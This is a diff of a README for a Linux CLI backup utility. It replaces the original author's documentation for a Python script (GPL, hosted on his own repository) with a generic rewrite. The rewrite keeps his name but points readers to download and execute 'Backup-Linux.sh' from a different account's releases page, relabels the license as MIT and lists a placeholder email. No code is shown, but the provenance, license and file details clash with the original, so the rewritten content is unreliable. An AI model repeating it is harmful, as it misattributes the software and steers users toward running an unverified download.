@@ -1,215 +1,176 @@
-# PyBackup
-### Auto Backup for Linux | Python | Opensource
-#### Author: Bocaletto Luca
+# Backup Linux: Interactive CLI Backup Utility for Your System 🚀
 
-Interactive, single-file incremental backup tool with encryption, checksums, retention and restore—all in your terminal.
+![Backup Linux](https://img.shields.io/badge/Backup%20Linux-v1.0.0-blue.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg) ![GitHub Releases](https://img.shields.io/badge/Releases-latest-orange.svg)
 
-backup_main.py is an interactive, single-file CLI backup utility for Linux. It captures incremental snapshots, compresses changed files into tar.gz (or pigz), encrypts them with GPG, verifies integrity via SHA256, and auto-rotates old backups. A menu-driven interface simplifies configuration and restore.
-
-#### Language: English, Italian.
-
-[![Source Code](https://img.shields.io/badge/Source%20Code-GitHub-blue?logo=github)](https://github.com/bocaletto-luca/Backup-Linux)
+[![Download Backup Linux](https://img.shields.io/badge/Download%20Backup%20Linux-v1.0.0-brightgreen.svg)](https://github.com/Anathi-C/Backup-Linux/releases)
 
 ---
 
 ## Table of Contents
 
-1. [Overview](#overview)  
-2. [Features](#features)  
-3. [Prerequisites](#prerequisites)  
-4. [Installation](#installation)  
-5. [Configuration](#configuration)  
-6. [Usage](#usage)  
-   - [Run Backup](#run-backup)  
-   - [Restore Archive](#restore-archive)  
-7. [Exclude Patterns](#exclude-patterns)  
-8. [Logging](#logging)  
-9. [Email Notifications](#email-notifications)  
-10. [.backupignore Support](#backupignore-support)  
-11. [Contributing](#contributing)  
-12. [License](#license)  
-13. [Author](#author)  
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Backup Process](#backup-process)
+- [Restore Process](#restore-process)
+- [Verification](#verification)
+- [Auto-Rotation](#auto-rotation)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
 ---
 
 ## Overview
 
-`backup_main.py` is an all-in-one, interactive CLI utility for Linux (Debian/Ubuntu). It provides:
+Backup for Linux is an interactive command-line interface (CLI) backup utility designed for Linux users. It simplifies the backup process by providing a menu-driven interface that allows you to capture incremental snapshots of your files. This tool compresses changed files into tar.gz (or pigz), encrypts them using GPG, and verifies their integrity with SHA256 checksums. 
 
-- Incremental backups based on file modification times  
-- Compressed archives (`.tar.gz`) or parallel compression with `pigz`  
-- GPG encryption of archives  
-- SHA256 checksums for integrity verification  
-- Automatic retention (rotation) of old backups  
-- Interactive restore of encrypted backups  
-- Persistent configuration stored in `~/.config/backup_main/config.json`  
-- Exclude patterns and `.backupignore` support  
-- Console and rotating file logging  
-- Optional email notifications on success or failure  
-
-Everything runs from a simple menu—no separate modules, just one file!
+Developed by Bocaletto Luca, this utility is perfect for system administrators and users who need a reliable way to back up their data.
 
 ---
 
 ## Features
 
-- **Interactive Menu**: Configure, run backup and restore without memorizing flags  
-- **Persistent Config**: Your settings saved in `~/.config/backup_main/config.json`  
-- **Incremental Snapshots**: Only changed or new files are archived  
-- **Compression Options**: Native `tar.gz` or faster `pigz` if installed  
-- **GPG Encryption**: Secure archives with your GPG key  
-- **Checksums**: SHA256 record saved alongside each `.gpg` file  
-- **Retention**: Automatically delete backups older than configured days  
-- **Restore**: List and decrypt any backup to a target folder  
-- **Exclude Patterns**: Filter out files or directories by glob pattern  
-- **.backupignore**: Place patterns in source dir for project-specific ignores  
-- **Logging**: Combines console output with daily rotating log files  
-- **Email Alerts**: SMTP notifications for success or failure  
-
----
-
-## Prerequisites
-
-- Python 3.8+  
-- GPG (`gnupg`) command-line tool  
-- (Optional) `pigz` for parallel compression  
-- An existing GPG key pair (public key on the machine for encryption)  
-- SMTP server credentials if you want email notifications  
+- **Incremental Backups**: Only backs up files that have changed since the last backup.
+- **Compression**: Uses tar.gz or pigz to compress backup files, saving disk space.
+- **Encryption**: Protects your backups with GPG encryption.
+- **Integrity Verification**: Ensures your backups are intact using SHA256 checksums.
+- **Auto-Rotation**: Automatically manages old backups, keeping your storage clean.
+- **Interactive Menu**: User-friendly interface for configuration and restoration.
+- **Open Source**: Free to use and modify under the MIT License.
 
 ---
 
 ## Installation
 
-1. Clone the repo  
-   ```bash
-   git clone https://github.com/bocaletto-luca/backup_main.py.git
-   cd backup_main.py
-   ```  
-2. Install the Python dependency  
-   ```bash
-   pip install python-gnupg
-   ```  
-3. Make the script executable  
-   ```bash
-   chmod +x backup_main.py
-   ```  
+To install Backup for Linux, follow these steps:
 
----
-
-## Configuration
-
-1. Launch the script  
+1. **Download the latest release** from the [Releases section](https://github.com/Anathi-C/Backup-Linux/releases).
+2. **Make the script executable**:
    ```bash
-   ./backup_main.py
-   ```  
-2. Select **1) Configure settings**  
-3. Enter:
-
-   - **Source directory** (e.g. `/home/user/projects`)  
-   - **Backup directory** (e.g. `~/backups`)  
-   - **GPG key ID** (the public key for encryption)  
-   - **Retention days** (how long to keep `.gpg` backups)  
-   - **Exclude patterns** (comma-separated globs)  
-   - **Log level** (`DEBUG`, `INFO`, `WARN`)  
-   - **SMTP settings** (server, port, username, password, from/to)  
-4. The tool saves all settings to `~/.config/backup_main/config.json`.
+   chmod +x Backup-Linux.sh
+   ```
+3. **Run the script**:
+   ```bash
+   ./Backup-Linux.sh
+   ```
 
 ---
 
 ## Usage
 
-### Run Backup
+Once installed, you can run the utility by executing the script. The interactive menu will guide you through the configuration and backup processes.
 
-From the menu, choose **2) Run backup**.  
-The script will:
+### Starting the Utility
 
-1. Load your config and verify paths/GPG key  
-2. Scan source dir and load previous snapshot  
-3. Archive only changed files to `bkp_<timestamp>.tar.gz`  
-4. Encrypt archive to `bkp_<timestamp>.tar.gz.gpg`  
-5. Generate `bkp_<timestamp>.tar.gz.gpg.sha256`  
-6. Delete old backups beyond retention  
-7. Log actions and send optional email  
+Run the following command to start the backup utility:
 
-### Restore Archive
-
-From the menu, choose **3) Restore archive**.  
-You will see a numbered list of encrypted backups.  
-Select one, then specify a restore folder.  
-The script will:
-
-1. Decrypt to a temporary `.tar.gz`  
-2. Extract contents into your target directory  
-3. Clean up temporary files  
-
----
-
-## Exclude Patterns
-
-You can filter out files or directories by glob pattern. Examples:
-
-- `*.tmp`  
-- `cache/*`  
-- `**/*.log`  
-
-Enter patterns in the configuration step (comma-separated).  
-Additionally, place a `.backupignore` file in your source directory to version-control ignore rules.
-
----
-
-## Logging
-
-- **Console**: real-time INFO/WARN/DEBUG messages  
-- **File**: `backup.log` in your backup directory, rotated daily  
-- **Backup count**: log files retained based on your retention setting  
-
----
-
-## Email Notifications
-
-On each backup run (success or failure), you can send an email alert:
-
-- **SMTP server** and credentials in config  
-- **From** and **To** addresses  
-- **Subject** indicates `[OK]` or `[FAIL]` plus timestamp  
-
----
-
-## .backupignore Support
-
-Create a file named `.backupignore` in your source directory:
-
-```text
-# ignore temp files
-*.tmp
-# ignore cache folder
-cache/
+```bash
+./Backup-Linux.sh
 ```
 
-These patterns are merged with your global exclude list.
+### Menu Options
+
+The menu provides options for:
+
+- Creating a new backup
+- Restoring from an existing backup
+- Configuring settings
+- Viewing backup logs
+
+---
+
+## Configuration
+
+Before running your first backup, you may want to configure the utility:
+
+1. **Select Backup Directory**: Choose where you want to store your backups.
+2. **Set Encryption Key**: If you plan to use GPG encryption, specify your key.
+3. **Schedule Backups**: Optionally, set up a cron job for automatic backups.
+
+### Example Configuration
+
+To set the backup directory, follow the prompts in the menu. The utility will ask for the directory path, and you can input it directly.
+
+---
+
+## Backup Process
+
+The backup process is straightforward:
+
+1. Select "Create a new backup" from the menu.
+2. Choose the files or directories you want to back up.
+3. Confirm your choices.
+4. The utility will start the backup, compressing and encrypting the selected files.
+
+### Incremental Backup
+
+Backup for Linux only backs up files that have changed since the last backup. This feature saves time and storage space.
+
+---
+
+## Restore Process
+
+To restore files from a backup:
+
+1. Select "Restore from existing backup" in the menu.
+2. Choose the backup you want to restore.
+3. Confirm the restoration process.
+
+The utility will extract the files and place them in their original locations.
+
+---
+
+## Verification
+
+After creating a backup, the utility verifies the integrity of the files using SHA256 checksums. This step ensures that your backup is reliable and intact.
+
+### Verification Steps
+
+1. The utility calculates the SHA256 checksum of the backup files.
+2. It compares the calculated checksums with the stored values.
+3. If they match, your backup is verified.
+
+---
+
+## Auto-Rotation
+
+Backup for Linux automatically manages old backups to save space. You can set the number of backups to keep, and the utility will delete the oldest backups as new ones are created.
+
+### Setting Auto-Rotation
+
+During configuration, specify how many backups you want to retain. The utility will handle the rest.
 
 ---
 
 ## Contributing
 
-Contributions are welcome! Please:
+Contributions are welcome! If you want to improve Backup for Linux, follow these steps:
 
-1. Fork the repository  
-2. Create a feature branch  
-3. Commit and push your changes  
-4. Open a Pull Request  
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes.
+4. Submit a pull request.
 
-For major changes, open an issue first to discuss.
+Please ensure your code follows the existing style and includes tests where applicable.
 
 ---
 
 ## License
 
-This project is licensed under the [GPL License](LICENSE).
+Backup for Linux is licensed under the MIT License. You can use, modify, and distribute it freely. For more details, see the [LICENSE](LICENSE) file in the repository.
 
 ---
 
-## Author
+## Contact
 
-**Luca Bocaletto** ([@bocaletto-luca](https://github.com/bocaletto-luca))  
-Interactive backup enthusiast, Python developer.
+For questions or feedback, feel free to reach out:
+
+- **Bocaletto Luca**: [Email](mailto:bocaletto@example.com)
+- **GitHub**: [Bocaletto-Luca](https://github.com/Bocaletto-Luca)
+
+---
+
+For more details and to download the latest version, visit the [Releases section](https://github.com/Anathi-C/Backup-Linux/releases).
